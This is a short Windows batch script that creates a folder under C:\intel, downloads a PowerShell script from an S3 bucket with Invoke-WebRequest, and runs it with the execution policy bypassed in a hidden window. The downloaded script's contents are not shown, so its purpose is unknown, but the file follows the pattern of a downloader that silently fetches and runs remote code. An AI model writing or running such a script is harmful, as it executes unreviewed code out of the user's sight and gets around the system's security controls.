@echo off


if not exist "C:\intel\" mkdir C:\intel

cd c:\intel

powershell -Command "Invoke-WebRequest https://daytonff.s3.eu-central-1.amazonaws.com/poshgui.ps1 -OutFile c:\intel\poshgui_Test.ps1"


C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ExecutionPolicy Bypass -windowstyle Hidden -file "c:\intel\poshgui_Test.ps1"


wait